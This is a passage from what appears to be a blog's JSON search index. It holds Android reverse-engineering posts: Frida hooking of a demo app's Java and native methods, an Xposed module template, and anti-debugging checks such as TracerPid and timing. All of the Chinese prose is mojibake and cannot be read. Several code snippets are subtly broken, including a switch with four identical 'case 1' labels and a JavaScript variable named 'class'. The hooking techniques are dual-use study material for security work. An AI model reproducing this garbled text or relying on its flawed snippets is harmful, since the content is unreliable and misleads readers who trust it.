¹æœ¬æ²¡æœ‰èµ°ä»£ç†é€šé“ã€‚åŸç†å‚è§é“¾æ¥ã€‚ ä¸Šè¿°é“¾æ¥çš„æœ€åæåˆ°äº†è¯¥é—®é¢˜çš„è§£å†³æ–¹æ³•ï¼Œå³ä½¿ç”¨drony appå¯¹ç‰¹å®šçš„åº”ç”¨è¿›è¡ŒæŒ‡å®šä»£ç†ã€‚ å†æ¬¡æµ‹è¯•ï¼Œå‘ç°æŠ“åˆ°äº†ç™»å½•è¯·æ±‚ï¼š","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"}]},{"title":"Hook Framework","slug":"Hookæ¡†æ¶","date":"2021-03-15T09:11:28.000Z","updated":"2021-03-26T01:05:41.563Z","comments":true,"path":"2021/03/15/Hookæ¡†æ¶/","link":"","permalink":"http://example.com/2021/03/15/Hook%E6%A1%86%E6%9E%B6/","excerpt":"æˆªè·æ¶ˆæ¯ï¼Œè·å¾—æ§åˆ¶æƒã€‚","text":"æˆªè·æ¶ˆæ¯ï¼Œè·å¾—æ§åˆ¶æƒã€‚ HOOKæ¡†æ¶æ˜¯ä¸€ç§Androidé€†å‘æŠ€æœ¯ã€‚åœ¨ç³»ç»Ÿæ²¡æœ‰è°ƒç”¨è¯¥å‡½æ•°ä¹‹å‰ï¼ŒHookå°±å…ˆæ•è·è¯¥æ¶ˆæ¯ï¼ŒHookå‡½æ•°å…ˆå¾—åˆ°æ§åˆ¶æƒï¼Œè¿™æ—¶Hookå‡½æ•°æ—¢å¯ä»¥ä¿®æ”¹ç¨‹åºæ‰§è¡Œé€»è¾‘ï¼Œæ”¹å˜å‚æ•°è¿”å›å€¼ï¼Œè¿˜å¯ä»¥å¼ºåˆ¶ç»“æŸæ¶ˆæ¯çš„ä¼ é€’ã€‚æœ¬æ–‡ä»‹ç»å¸¸ç”¨çš„ä¸¤ç§ã€‚ FridaFridaæ˜¯åŸºäºJavaScriptå’Œpythonçš„ï¼Œå¯ä»¥å®ç°å¯¹androidç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•çš„å·¥å…·åŒ…ï¼Œå¯ä»¥ç”¨äºä¸‹åˆ—ç”¨é€”ï¼š è®¿é—®è¿›ç¨‹çš„å†…å­˜ åº”ç”¨ç¨‹åºè¿è¡Œæ—¶è¦†ç›–åŠŸèƒ½ ä»å¯¼å…¥çš„ç±»è°ƒç”¨å‡½æ•° åŠ¨æ€Hookè·Ÿè¸ªã€æ‹¦æˆªå‡½æ•° åœ¨å †ä¸ŠæŸ¥æ‰¾å¯¹è±¡å®ä¾‹å¹¶ä½¿ç”¨è¿™äº›å¯¹è±¡å®ä¾‹ Fridaçš„æœ¬è´¨æ˜¯ç»™äºŒè¿›åˆ¶æ–‡ä»¶æ’æ¡©ï¼Œç”¨å®‰å“åº”ç”¨ä¸¾ä¾‹ï¼šåœ¨æ‰‹æœºä¸Šè¿è¡Œfrida_serverå¹¶ä¸”è½¬å‘ç«¯å£åˆ°PCç«¯ï¼ŒPCç«¯åˆåˆ©ç”¨pythonä»£ç ä¸serverè¿›è¡Œé€šä¿¡ï¼Œå¹¶ç”¨JavaScriptå¯¹äºæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹è¿›è¡Œæ³¨å…¥ï¼Œè¾¾åˆ°å†…å­˜è®¿é—®çš„ç›®çš„ã€‚å¦‚å›¾ï¼š æœ¬æ–‡å¯¹ç¤ºä¾‹çš„ä¸¤ä¸ªapkåˆ†åˆ«è¿›è¡Œjavaå±‚å’Œnativeå±‚çš„hookè°ƒè¯•ã€‚ Javaå±‚1.æ‰‹æœºç«¯ç¯å¢ƒé…ç½® ä¸‹è½½frida_serverå¹¶pushè‡³æ‰‹æœºä¸­ adb shellä¸­è¿è¡Œï¼Œå¹¶è½¬å‘ç«¯å£(é»˜è®¤ç«¯å£ä¸º27042) 1adb forward tcp:27042 tcp:27042 2.Java ä»£ç åˆ†ædemoä¸­éœ€è¦åˆ†æçš„ä»£ç æ®µå¦‚ä¸‹ã€‚ 123456789101112131415161718192021222324252627282930//In MainActivity:public void onClick(View arg6) &#123; switch(arg6.getId()) &#123; //Button 1 case 2131230720: &#123; Toast.makeText(this.getApplication(), new StringBuilder(String.valueOf(Utils.getCalc(2000, 5000))).toString(), 1).show(); break; &#125; //Button 2 case 2131230721: &#123; Toast.makeText(this.getApplication(), Utils.getMoney().getInfo(), 1).show(); break; &#125; //Button 3 case 2131230722: &#123; Toast.makeText(this.getApplication(), Utils.test(0x7CB8), 1).show(); break; &#125; //Button 4 case 2131230723: &#123; Toast.makeText(this.getApplication(), Utils.test(), 1).show(); break; &#125; //Button 5 case 2131230724: &#123; Toast.makeText(this.getApplication(), Utils.test(), 1).show(); break; &#125; &#125;&#125; å…¶ä¸­äº”ä¸ªButtonåˆ†åˆ«å¯¹åº”äº†å¦‚ä¸‹äº”ç§å‡½æ•°ç±»å‹ã€‚å…¶Javaä»£ç åŠJavaScriptæ³¨å…¥è„šæœ¬å¦‚ä¸‹ï¼š Button 1:æ™®é€šæ–¹æ³• 123public static int getCalc(int arg1, int arg2) &#123; return arg1 + arg2;&#125; ğŸ‘‡ 1234567891011121314151617Java.perform(function () &#123; //é€šè¿‡Java.use()æ‰¾åˆ°éœ€è¦hookçš„javaç±»ä¸ºå˜é‡åˆå§‹åŒ– var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); //ä¸ºutilç±»ä¸­çš„getCalcæ–¹æ³•ç¼–å†™hookè„šæœ¬ï¼šå‚æ•°ä¸ºa,b utils.getCalc.implementation = function (a, b) &#123; //logæ–¹å¼è¾“å‡º console.log(&quot;Hook Start...&quot;); //ç»ˆç«¯æ–¹å¼è¾“å‡ºï¼Œåˆ†åˆ«è¾“å‡ºJavaå±‚ä¸­ç»™getCalcå‡½æ•°ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•° send(arguments[0]); send(arguments[1]); send(&quot;Success!&quot;); var num=arguments[0]+arguments[1]; send(&quot;è¿”å›å€¼:&quot;); send(num); console.log(this.getCalc(arguments[0],arguments[1])); &#125;&#125;); Button 2:æ„é€ æ–¹æ³• 12345public Money(int arg1, String arg2) &#123; super(); this.num = arg1; this.name = arg2;&#125; ğŸ‘‡ 123456789101112Java.perform(function () &#123; var money = Java.use(&#x27;com.frida.test.Money&#x27;); //&quot;$init&quot;è¡¨ç¤ºmoneyç±»çš„æ„é€ å‡½æ•° money.$init.implementation = function (a, b) &#123; console.log(&quot;Hook Start...&quot;); send(arguments[0]); send(arguments[1]); send(&quot;Success!&quot;); //åŸä¼ å…¥å‚æ•°ä¸º:100,&quot;RMB&quot; return this.$init(10000, &quot;Dollor&quot;); &#125;&#125;); Button 3:é‡è½½æ–¹æ³• 1234567public static String test(int arg2) &#123; return &quot;Test string 2:&quot; + arg2;&#125;public static String test() &#123; return &quot;This is a test string&quot;;&#125; ğŸ‘‡ 12345678910Java.perform(function () &#123; var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); //ç»‘å®šå‚æ•°ç±»å‹ä¸º(int)çš„testé‡è½½å‡½æ•° utils.test.overload(&quot;int&quot;).implementation = function (a) &#123; console.log(&quot;Hook Start...&quot;); send(arguments[0]); send(&quot;Success!&quot;); return &quot;3.1415926&quot;; &#125;&#125;); Button4ã€5åœ¨javaå±‚ä¸­è°ƒç”¨äº†ç›¸åŒçš„å‡½æ•°ï¼š 123public static String test() &#123; return &quot;This is a test string&quot;;&#125; ä½†æ˜¯é€šè¿‡æ³¨å…¥ä¸åŒçš„Javascripè„šæœ¬å®ç°å¦‚ä¸‹çš„ä¸åŒåŠŸèƒ½ã€‚ æ„é€ å¯¹è±¡å‚æ•° 12345678910111213Java.perform(function () &#123; //æ­¤å¤„æ„é€ ä¸¤ä¸ªæ–°å¯¹è±¡ var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); var money = Java.use(&#x27;com.frida.test.Money&#x27;); //testå‡½æ•°ä½œä¸ºè½½ä½“ utils.test.overload().implementation = function () &#123; send(&quot;Hook Start...&quot;); //åŠ«æŒç¨‹åºæ‰§è¡Œæ–°å¯¹è±¡çš„æ„é€ å‡½æ•° var mon = money.$new(2000,&#x27;æ¸¯å¸&#x27;); send(mon.getInfo()); return this.test(800); &#125;&#125;); ä¿®æ”¹å¯¹è±¡å±æ€§ 12345678910111213141516171819Java.perform(function () &#123; var utils = Java.use(&#x27;com.frida.test.Utils&#x27;); var money = Java.use(&#x27;com.frida.test.Money&#x27;); var class = Java.use(&#x27;java.lang.Class&#x27;); utils.test.overload().implementation = function () &#123; send(&quot;Hook Start...&quot;); var mon = money.$new(200,&#x27;æ¸¯å¸&#x27;); send(mon.getInfo()); //å°†å˜é‡ç»‘å®šä¸ºmoneyå¯¹è±¡çš„numå±æ€§ var numid= Java.cast(mon.getClass(),class).getDeclaredField(&#x27;num&#x27;); //å°†å˜é‡è®¾ä¸ºå¯ä¿®æ”¹ numid.setAccessible(true); send(numid.get(mon)); //ä¿®æ”¹ numid.setInt(mon, 1000); send(mon.getInfo()); return this.test(800); &#125;&#125;); ä¸Šè¿°JavaScriptè„šæœ¬å‡éœ€è¦æ’å…¥åˆ°pythonä»£ç ä¸­ä»¥è¿è¡Œä½¿ç”¨ï¼š 1234567891011121314jscode=&quot;&quot;&quot;æ­¤å¤„æ’å…¥jsä»£ç ï¼Œç”¨ä¸‰å¼•å·åŒ…å›´&quot;&quot;&quot;def message(message, data): if message[&quot;type&quot;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)process = frida.get_remote_device().attach(&#x27;com.frida.test&#x27;)script= process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read() Nativeå±‚soå±‚ä»£ç ï¼š 12345678910111213141516171819int __fastcall Java_com_example_fridaso_FridaSoDefine_FridaSo(int a1, int a2, int a3, int a4ï¼Œint a5)&#123; switch(a5): case 1: return a4 + a3; break; case 1: return a3 - a4; break; case 1: return a4 * a3; break; case 1: return a3 / a4; break; default: return 0; break;&#125; Javascriptè„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//setImmediateåŒ…å›´ï¼Œå¯é˜²æ­¢è¶…æ—¶æŠ¥é”™setImmediate(function () &#123; send(&quot;start&quot;); //éå†æ¨¡å—æ‰¾åŸºå€ Process.enumerateModules(&#123; onMatch: function (exp) &#123; if (exp.name == &#x27;libdemo.so&#x27;) &#123; send(&#x27;enumerateModules find&#x27;); send(exp.name + &quot;|&quot; + exp.base + &quot;|&quot; + exp.size + &quot;|&quot; + exp.path); send(exp); return &#x27;stop&#x27;; &#125; &#125;, onComplete: function () &#123; send(&#x27;enumerateModules stop&#x27;); &#125; &#125;); //hookå¯¼å‡ºå‡½æ•° var exports = Module.enumerateExportsSync(&quot;libdemo.so&quot;); for(var i=0;i&lt;exports.length;i++)&#123; send(&quot;name:&quot;+exports[i].name+&quot; address:&quot;+exports[i].address); &#125; //é€šè¿‡æ¨¡å—åç›´æ¥æŸ¥æ‰¾åŸºå€ var baseSOFile = Module.findBaseAddress(&quot;libdemo.so&quot;); //&quot;Interceptor.attach&quot;è·å–è¿›ç¨‹ï¼Œæ­¤å¤„è‹¥ä¸ºthumbæ±‡ç¼–åˆ™éœ€è¦æ”¹æˆ0x1270+1 Interceptor.attach(baseSOFile.add(0x00001270),&#123; onEnter: function(args) &#123; //å‚æ•°1ä¸ºJNIEnv * console.log(Memory.readCString(args[0])); //å‚æ•°2ä¸ºjclass console.log(Memory.readUtf16String(args[3])); console.log(args[2]); console.log(args[3]); console.log(args[4]); &#125;, onLeave: function(retval)&#123; &#125; &#125;); //é€šè¿‡åŒ…åç±»åå‡½æ•°åæ‰¾åˆ°åŸºå€è·å–ç¨‹åºè¿›ç¨‹ Interceptor.attach(Module.findExportByName(&quot;libfridaso.so&quot;,&quot;Java_com_example_fridaso_FridaSoDefine_FridaSo&quot;),&#123; //onEnteråœ¨å‡½æ•°æ‰§è¡Œå‰æ‰§è¡Œï¼Œargsæ˜¯å‡½å‚ onEnter: function(args) &#123; send(&quot;Hook start&quot;); send(&quot;args[2]=&quot; + args[2]); send(&quot;args[3]=&quot; + args[3]); &#125;, //onLeaveåœ¨å‡½æ•°æ‰§è¡Œç»“æŸåæ‰§è¡Œï¼Œretvalæ˜¯è¿”å›å€¼ onLeave: function(retval)&#123; send(&quot;return:&quot;+retval); retval.replace(0); //æ›¿æ¢è¿”å›å€¼ &#125; &#125;);&#125;); Xposed FrameworkåŸç†ç®€è¿°Xposedæ¡†æ¶é€šè¿‡å®‰è£…æ¨¡å—æ¥å®ç°éœ€è¦çš„åŠŸèƒ½ã€‚æ‰€è°“æ¨¡å—æ˜¯æŒ‡ä¸€ç±»ç‰¹æ®Šçš„appï¼Œæ­¤ç±»appé€šè¿‡ä¿®æ”¹Zygoteæ¥å®ç°ä¸€äº›è®¾è®¡å†…æ ¸ä»¥åŠé«˜æƒé™çš„åŠŸèƒ½ï¼Œç”±Xposedç®¡ç†ã€‚å…¶ä¸­ï¼ŒZygoteæ˜¯Androidçš„å†…æ ¸ï¼Œæ¯ä¸ªAPPå‡ç”±Zygote forkå‡ºçš„è™šæ‹Ÿæœºæ¥è¿è¡Œï¼Œè€ŒXposedæ¡†æ¶ä¸­çš„æ¨¡å—å¯ä»¥é‡å†™å¹¶æ›¿æ¢Zygoteçš„æ‰§è¡Œæ–‡ä»¶app_processï¼Œå³å¯ä»ä¸€å¼€å§‹å°±ä¿®æ”¹æ•´ä¸ªè¿›ç¨‹ã€‚ è¯¦ç»†åŸç†å‚è§é“¾æ¥ã€‚ ä½¿ç”¨è¿‡ç¨‹æ‰‹æœºç«¯1.æ‰‹æœºrootåç›´æ¥å®‰è£…xpose installer ï¼Œéœ€è¦æ³¨æ„android5.0ä»¥ä¸‹å’Œä»¥ä¸Šå®‰è£…çš„æ˜¯ä¸åŒç‰ˆæœ¬ã€‚ 2.é‡å¯åæç¤ºå®‰è£…å®Œæˆ PCç«¯1.åœ¨Android Studioä¸­æ–°å»ºç©ºç™½å·¥ç¨‹(No Activity)ï¼Œå°†åº“æ–‡ä»¶æ‹–å…¥libsç›®å½•ã€‚ 2.åœ¨Javaé¡¹ç›®çš„ç¬¬ä¸€ä¸ªåŒ…é‡Œæ–°å»ºclassã€‚ ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839package com.example.xp;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage; public class hook implements IXposedHookLoadPackage &#123; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable &#123; if(loadPackageParam.packageName.equals(&quot;åŒ…å&quot;))&#123; XposedHelpers.findAndHookMethod(&quot;åŒ…å.ç±»å&quot;, loadPackageParam.classLoader, &quot;hookå‡½æ•°å&quot;, String.class, String.class, new XC_MethodHook() &#123; @Override //æ‰§è¡Œè¢«hookå‡½æ•°å‰è¿è¡Œ protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); XposedBridge.log(&quot;Arg1: &quot; + param.args[0]); XposedBridge.log(&quot;Arg2: &quot; + param.args[1]); //XposedBridge.log(&quot;Arg3: &quot; + param.args[2]); //æ‰“å°å †æ ˆä¿¡æ¯ StackTraceElement[] wodelogs = new Throwable(&quot;wodelog&quot;).getStackTrace(); for(int i=0;i&lt;wodelogs.length;i++)&#123; XposedBridge.log(&quot;æŸ¥çœ‹å †æ ˆ:&quot;+wodelogs[i].toString()); &#125; &#125; @Override //æ‰§è¡Œè¢«hookå‡½æ•°åè¿è¡Œ(è¿”å›å‰) protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; super.afterHookedMethod(param); XposedBridge.log(&quot;Result before modified: &quot; + param); param.setResult(true); // å‡½æ•°è¿”å›å€¼ä¿®æ”¹ä¸ºtrue &#125; &#125;); &#125; &#125;&#125; 3.åˆ›å»ºassetsæ–‡ä»¶å¤¹ï¼Œæ–°å»ºæ–‡ä»¶xposed_initï¼Œå†™å…¥â€œåŒ…å+ç±»åâ€ï¼Œæ¨¡å—ä»æ­¤å¤„å¯»æ‰¾ç¨‹åºå…¥å£ã€‚ 4.ä¿®æ”¹æ¸…å•æ–‡ä»¶AndroidManifest.xmlï¼Œåœ¨æ ‡ç­¾ä¹‹é—´æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š 1234567891011121314&lt;!-- æ·»åŠ æ ‡è¯† --&gt; &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot;/&gt; &lt;!-- è½½å…¥Hookæ¨¡å—ä¹‹åæ˜¾ç¤ºçš„ä¿¡æ¯ --&gt; &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;Xposed Proxy For HOOK&quot;/&gt; &lt;!-- è§„å®šjaråŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ --&gt; &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;54&quot;/&gt; ğŸ‘‡ 5.ä¿®æ”¹build.gradle(app)ï¼Œæ·»åŠ sourceSetsæ®µè½ï¼Œä¿®æ”¹fileTreeä¸ºcompileOnly 6.æ„é€ è¿è¡Œï¼Œåœ¨è™šæ‹Ÿæœºä¸­æŸ¥çœ‹ï¼Œåœ¨installerä¸­å‹¾é€‰æ¨¡å— 7.é‡å¯ååœ¨installerä¸­æŸ¥çœ‹æ—¥å¿—ï¼Œå®‰è£…å®Œæˆ","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Android Protection","slug":"Android Protection","date":"2021-03-08T04:27:03.000Z","updated":"2021-03-25T12:01:59.987Z","comments":true,"path":"2021/03/08/Android Protection/","link":"","permalink":"http://example.com/2021/03/08/Android%20Protection/","excerpt":"å…³äºAPKåŒ…çš„ä¿æŠ¤ä»¥åŠä»£ç çš„åè°ƒè¯•æ–¹æ³•ã€‚","text":"å…³äºAPKåŒ…çš„ä¿æŠ¤ä»¥åŠä»£ç çš„åè°ƒè¯•æ–¹æ³•ã€‚ APKä¿æŠ¤Javaä»£ç æ··æ·†é€šå¸¸ä¸ºäº†æé«˜ä»£ç å¯è¯»æ€§ï¼Œå¼€å‘è€…ä¼šç»™å„ä¸ªæ ‡è¯†èµ‹äºˆç›¸åº”çš„æ„ä¹‰ï¼ŒåŒ…åç±»åéƒ½ä¼šç»è¿‡ç›¸åº”çš„å‘½åã€‚ä½†æ˜¯å½“ç¨‹åºè¢«æ‰“åŒ…æ—¶ï¼Œä¸éœ€è¦è€ƒè™‘å¯è¯»æ€§ï¼Œå› ä¸ºåŒ…åç±»åæˆ–è€…æ ‡è¯†ç¬¦åªéœ€è¦èƒ½å‡†ç¡®å¯»å€å³å¯ï¼Œäºæ˜¯å¼€å‘è€…ä¼šå¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„æºä»£ç è¿›è¡Œæ··æ·†ï¼Œè¿™æ ·å¯ä»¥ä¸€å®šç¨‹åº¦çš„å¢åŠ é€†å‘è¿‡ç¨‹ä¸­æ‰€éœ€çš„æ—¶é—´ã€‚ ä½å¯è¯»æ€§å¯ä»¥åŠé€€ä¸€éƒ¨åˆ†é€†å‘è€…ï¼Œä½†æ˜¯æœ¬è´¨ä¸Šæ¥è¯´ï¼Œæ•´ä¸ªä»£ç çš„é€»è¾‘å¹¶æ²¡æœ‰æ”¹å˜ï¼Œå› æ­¤å¹¶ä¸èƒ½ä¸€åŠ³æ°¸é€¸åœ°è§£å†³ä»£ç ä¿æŠ¤çš„é—®é¢˜ã€‚ èµ„æºæ–‡ä»¶æ··æ·†ç±»ä¼¼ä»£ç æ··æ·†ï¼Œé™ä½èµ„æºidå’Œèµ„æºæ–‡ä»¶åçš„å¯è¯»æ€§ã€‚ ç­¾åéªŒè¯æŸäº›apkæ–‡ä»¶è§£å‹åï¼Œå‘ç°é‡Œé¢å­˜åœ¨MANIFEST.MFæ–‡ä»¶ï¼Œè¿™å°±æ˜¯apkçš„ç­¾åæ–‡ä»¶ã€‚ ç­¾åæ–‡ä»¶ä¸­ä¿å­˜ç€apkæ–‡ä»¶çš„ä¿¡æ¯æ‘˜è¦å¹¶è¿›è¡Œäº†åŠ å¯†ï¼Œå¦‚æœé€šè¿‡é€†å‘å¯¹apkè¿›è¡Œé‡æ–°æ‰“åŒ…ï¼Œä¼šä½¿å¾—ç­¾åæ–‡ä»¶ä¸åŸæ–‡ä»¶ä¸ä¸€è‡´ï¼Œæ— æ³•é€šè¿‡ç­¾åæ ¡éªŒã€‚ ç­¾åéªŒè¯æ–¹å¼å¾ˆå¤šï¼Œä»¥ä¸‹ä¾‹å­æ˜¯è¢«å®šä¹‰åœ¨nativeå±‚çš„ä¸‰ä¸ªç­¾åç›¸å…³å‡½æ•°ï¼Œäººé€çˆ±ç§°â€œç­¾åä¸‰å…„å¼Ÿâ€ã€‚ 123getPackageName()getPackageManage()getPackageInfo() ç­¾åéªŒè¯å¯ä»¥é€šè¿‡ä¿®æ”¹ç¨‹åºé€»è¾‘è¿›è¡Œç»•è¿‡ï¼Œå®é™…æƒ…å†µå®é™…åˆ†æã€‚ åè°ƒè¯•å…³é”®æ–‡ä»¶æ£€æµ‹éå†**/data/local/tmpè·¯å¾„ï¼ŒæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨android_serverï¼Œandroid_server64**è¿™æ ·çš„æ–‡ä»¶ã€‚å¦‚æœå­˜åœ¨åˆ™æ€æ­»å½“å‰è¿›ç¨‹ã€‚ è°ƒè¯•ç«¯å£æ£€æµ‹ä¸€äº›è°ƒè¯•å™¨åœ¨è°ƒè¯•å®‰å“ç¨‹åºæ—¶ä¼šå ç”¨é»˜è®¤çš„ç«¯å£ï¼Œä¾‹å¦‚IDAä½¿ç”¨çš„ç«¯å£ï¼š23946ã€‚æ£€éªŒå ç”¨è¿™äº›ç«¯å£çš„è¿›ç¨‹å³å¯è½»æ˜“åˆ¤æ–­ç¨‹åºæ˜¯å¦è¢«è°ƒè¯•ã€‚ ä½†æ¢æˆéé»˜è®¤ç«¯å£å³å¯ç»•è¿‡ã€‚ è¿›ç¨‹åç§°æ£€æµ‹Androidç³»ç»Ÿä¸­(å…¶å®Linuxä¹Ÿæ˜¯)ï¼Œæ¯ä¸ªè¿›ç¨‹è¿è¡Œæ—¶éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œè·¯å¾„ä¸º**/proc/pid/ï¼Œå…¶ç›®å½•ä¸‹çš„status**æ–‡ä»¶ç”¨äºè®°å½•è¿›ç¨‹çŠ¶æ€ã€‚è€Œstatusæ–‡ä»¶ä¸­çš„Traceridå­—æ®µï¼Œåˆç”¨äºè®°å½•å½“å‰è¿›ç¨‹çš„è°ƒè¯•è¿›ç¨‹pidã€‚ æ£€æµ‹æ—¶åªéœ€è¯»å–æ­¤å¤„çš„pidåˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºå†æŸ¥è¯¢æ­¤pidå¯¹åº”çš„æ˜¯ä»€ä¹ˆè¿›ç¨‹ã€‚å¦‚æœæ˜¯android_serverè¿™æ ·çš„ä¸è°ƒè¯•ç›¸å…³è¿›ç¨‹ï¼Œåˆ™ç›´æ¥æ€æ­»å½“å‰è¿›ç¨‹é˜»æ­¢è°ƒè¯•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738void coursecheck()&#123; const int bufsize = 1024; char filename[bufsize]; char line[bufsize]; char name[bufsize]; char nameline[bufsize]; int pid = getpid(); //å…ˆè¯»å–Tracepidçš„å€¼ sprintf(filename, &quot;/proc/%d/status&quot;, pid); FILE *fd=fopen(filename,&quot;r&quot;); if(fd!=NULL) &#123; while(fgets(line,bufsize,fd)) &#123; if(strstr(line,&quot;TracerPid&quot;)!=NULL) &#123; int statue =atoi(&amp;line[10]); if(statue!=0) &#123; sprintf(name,&quot;/proc/%d/cmdline&quot;,statue); FILE *fdname=fopen(name,&quot;r&quot;); if(fdname!= NULL) &#123; while(fgets(nameline,bufsize,fdname)) &#123; if(strstr(nameline,&quot;android_server&quot;)!=NULL) &#123; int ret=kill(pid,SIGKILL); &#125; &#125; &#125; fclose(fdname); &#125; &#125; &#125; &#125; fclose(fd);&#125; è½®è¯¢æ£€æµ‹å¾ªç¯æ£€æµ‹å½“å‰è¿›ç¨‹çŠ¶æ€æ–‡ä»¶ï¼Œå³ ï¼Œåˆ¤æ–­traceridå­—æ®µæ˜¯å¦ä¸º0ï¼Œè‹¥ä¸ä¸º0åˆ™åˆ¤å®šè¿›ç¨‹å¤„äºè¢«debugçŠ¶æ€ï¼Œè¿›è€Œå…³é—­è¿›ç¨‹ã€‚ Self-Debuggingå½“å‰è¿›ç¨‹fork()å¾—åˆ°å­è¿›ç¨‹åï¼Œå­è¿›ç¨‹å¯¹çˆ¶è¿›ç¨‹è¿›è¡Œdebugï¼Œç”±äºçˆ¶è¿›ç¨‹è¢«å ç”¨(è¿›ç¨‹åŒä¸€æ—¶é—´åªèƒ½è¢«ä¸€ä¸ªè¿›ç¨‹attach)ï¼Œä½¿å¾—å…¶ä»–ç¨‹åºæ— æ³•ç›´æ¥å¯¹çˆ¶è¿›ç¨‹è¿›è¡Œdebugã€‚ è§£å†³æ–¹æ³•ï¼šé€šè¿‡debugå­è¿›ç¨‹æ¥é—´æ¥debugçˆ¶è¿›ç¨‹ã€‚ æ¨¡æ‹Ÿå™¨æ£€æµ‹æ ¹æ®æ¨¡æ‹Ÿå™¨çš„ç‰¹å¾ï¼Œç¨‹åºå¯ä»¥åˆ¤æ–­è‡ªèº«æ˜¯å¦è¿è¡Œäºæ¨¡æ‹Ÿå™¨ä¸­ã€‚ç‰¹å¾å€¼å¤§è‡´æœ‰ä¸‹é¢è¿™äº›ï¼š Device ID - è®¾å¤‡åºåˆ—å· ç”µè¯å·ç  IMSIè¯†åˆ«ç  è¿è¥å•†åç§° QEMUç›¸å…³çš„äºŒè¿›åˆ¶æ–‡ä»¶ CPUä¿¡æ¯ é™¤æ­¤ä¹‹å¤–çš„æ¨¡æ‹Ÿå™¨æ£€æµ‹æ–¹æ³•è¿˜æœ‰å¾ˆå¤šã€‚ Javaå±‚åè°ƒè¯•0x00.Debugæ¡ä»¶ apkä¸­çš„AndroidMainfest.xmlä¸­ï¼Œapplicationæ ‡ç­¾ä¸‹æœ‰è¯¥å±æ€§ï¼š 1Android:debuggable=true è®¾å¤‡å¯è°ƒè¯•ï¼Œå³æ‹¥æœ‰å¦‚ä¸‹å±æ€§ï¼š 1ro.debugable=1 è¯¥å±æ€§åˆä½äºboot.imgé•œåƒä¸­çš„/default.propæ–‡ä»¶ä¸­ï¼Œå‰è€…åœ¨è®¾å¤‡å¼€æœºå‰ç”±ramdisk æŒ‚è½½ã€‚å› æ­¤å¯ä»¥ä¿®æ”¹boot.imgä»è€Œä¿®æ”¹ro.debugableå±æ€§ä½¿å¾—è®¾å¤‡å…¨å±€å¯è°ƒè¯•ã€‚è¯¥é¡¹ä¿®æ”¹å¯é€šè¿‡MagiskåŠå…¶æ¨¡å—MagiskHide Props Configå®ç°ã€‚ 0x01.isDebuggerConnected()Android SDKä¸­çš„android.os.debugç±»æä¾›äº†ä¸€ä¸ªisDebuggerConnectedæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºåˆ¤æ–­JDWPè°ƒè¯•å™¨æ˜¯å¦æ­£åœ¨å·¥ä½œã€‚ å¯é€šè¿‡ä¿®æ”¹smaliä»£ç è¿›è¡Œç»•è¿‡ã€‚ 0x02.æ—¶é—´æˆ³æ£€æµ‹æ­£å¸¸æƒ…å†µä¸‹ç¨‹åºè¿è¡Œæ—¶å–ä¸¤ä¸ªæ—¶é—´æˆ³ï¼Œä¸¤è€…å·®å€¼è¾ƒå°ã€‚ä½†è‹¥æ˜¯åœ¨debugçŠ¶æ€ä¸‹ï¼Œæ—¶é—´å·®å€¼ä¼šè¶…å‡ºæ­£å¸¸å€¼ï¼Œè‹¥æ’é™¤ç¨‹åºå¡é¡¿å·²ç»bugçš„æƒ…å†µä¸‹å¯ä»¥æ–­å®šappå¤„äºdebugçŠ¶æ€ã€‚Expï¼š 123456789101112131415jint anti_time()&#123; int pid = getpid(); struct timeval t1; struct timeval t2; struct timezone tz; gettimeofday(&amp;t1, &amp;tz); gettimeofday(&amp;t2, &amp;tz); int timeoff = (t2.tv_sec) - (t1.tv_sec); LOGD(&quot;time %d&quot;,timeoff); if (timeoff &gt; 1) &#123; int ret = kill(pid, SIGKILL); return 1; &#125; return 0;&#125; 0x03.æ–­ç‚¹æ£€æµ‹ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¼šå°†elfæ–‡ä»¶(ä½¿ç”¨soçš„æƒ…å†µä¸‹)å¯¼å…¥å¯¼å…¥å†…å­˜ä¸­ï¼Œå¦‚æœå­˜åœ¨æ–­ç‚¹ï¼Œå†…å­˜ä¸­ä¹Ÿä¼šæ”¹å˜ç›¸åº”çš„æŒ‡ä»¤ï¼Œç•™ä¸‹thumbæˆ–è€…armçš„æ–­ç‚¹æŒ‡ä»¤çš„æœºå™¨ç ã€‚åˆ©ç”¨æŒ‡é’ˆéå†å†…å­˜ä¸­elfæ–‡ä»¶åˆ¤æ–­æœ‰æ— ä¸Šè¿°æœºå™¨ç ï¼Œå³å¯åˆ¤æ–­æœ‰æ— 